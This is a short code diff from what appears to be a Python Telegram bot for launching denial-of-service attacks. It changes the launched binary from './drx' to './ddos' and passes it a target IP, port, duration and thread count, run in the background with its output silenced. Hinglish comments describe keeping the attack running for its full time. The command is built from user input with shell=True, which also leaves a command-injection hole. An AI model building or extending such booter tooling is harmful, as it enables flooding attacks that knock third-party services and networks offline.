@@ -233,7 +233,7 @@ def send_help(message):
 def monitor_attack(attack_data, duration, chat_id):
     try:
         # 1. Binary ko background mein execute karna
-        binary_cmd = f"./drx {attack_data['ip']} {attack_data['port']} {duration} 500"
+        binary_cmd = f"./ddos {attack_data['ip']} {attack_data['port']} {duration} 500"
         subprocess.Popen(binary_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
         # 2. SAHI TIME TAK WAIT KARNA (Isse attack jaldi khatam nahi hoga)
